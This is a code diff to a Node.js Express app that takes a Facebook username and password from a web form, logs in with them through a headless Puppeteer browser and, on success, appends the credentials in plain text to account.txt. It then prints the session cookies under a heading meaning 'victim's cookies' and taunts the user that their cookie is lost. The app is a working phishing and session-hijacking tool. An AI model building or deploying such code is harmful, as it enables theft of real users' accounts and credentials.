@@ -1,7 +1,7 @@
 const express = require('express');
 const bodyParser = require('body-parser');
 const puppeteer = require('puppeteer')
-
+var fs = require('fs');
 const app = express();
 app.set('view engine', 'ejs');
 app.set('views', './views');
@@ -18,8 +18,11 @@ app.post('/', function (req, res) {
 	var password = req.body.password;
 
 	let autoLogin = async() => {
+		console.log('Dang thuc hien dang nhap voi...');
+		console.log('Username: ' + username);
+		console.log('Password: *******');
 	    const browser = await puppeteer.launch({
-	        headless: false
+	        headless: true
 	      })
 	      const page = await browser.newPage()
 	      await page.goto('https://www.facebook.com/login.php')
@@ -27,9 +30,6 @@ app.post('/', function (req, res) {
 	      const USER_SELECTOR = '#email'
 	      const PASSWORD_SELECTOR = '#pass'
 	      const BUTTON_LOGIN_SELECTOR = '#loginbutton'
-	      var pageTitle = await page.title();
-
-	      console.log("1-"+pageTitle)
 
 	    
 	      await page.click(USER_SELECTOR)
@@ -40,21 +40,30 @@ app.post('/', function (req, res) {
 
 	      await page.click(BUTTON_LOGIN_SELECTOR)
 
+	      console.log('Dang dang nhap...')
 	      await page.waitForNavigation()
-	      pageTitle = await page.title();
-	      console.log("2-"+pageTitle)
+	      var pageTitle = await page.title();
 
 	      if (pageTitle == "Đăng nhập Facebook | Facebook") {
+	      	console.log('Dang nhap that bai!')
 	      	res.redirect(301, '/')
 	      } else {
+		  	fs.appendFile('account.txt', username + '|' + password + ', \n', function (err) {
+			  if (err) throw err;
+			  console.log('Saved!');
+			});
+			
+	      	console.log('Dang nhap thanh cong!')
+	      	console.log('Dang lay cookies...')
 	      	const cookies = await page.cookies()
-	      	console.log(cookies);
+	      	console.log('-------------cookies cua nan nhan------------- ');
+
 	      	cookies.forEach((cookie, i) => {
 
 	      		console.log(cookie.name +'='+cookie.value + ';')
 
 	      	})
-	      	res.end('Đăng nhập thành công! Bạn đã bị mất cookie');
+	      	res.end('<h1>Dang nhap thanh cong! Ban da bi mat cookie ahihi!<h1>');
 	      }
 
 
